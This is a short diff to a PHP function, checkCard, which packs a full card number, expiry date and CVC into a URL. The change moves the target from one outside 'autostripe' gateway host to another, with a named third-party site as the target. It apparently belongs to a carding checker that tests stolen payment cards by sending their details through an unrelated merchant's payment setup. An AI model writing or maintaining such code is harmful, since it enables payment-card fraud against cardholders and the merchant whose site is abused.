@@ -11,7 +11,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     // API endpoint configuration
     $cc = "$card_number|$exp_month|$exp_year|$cvc";
     $encoded_cc = urlencode($cc);
-    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc={$encoded_cc}";
+    $api_url = "https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=shebrews.org&{$encoded_cc}";
 
     // Initialize cURL
     $ch = curl_init();
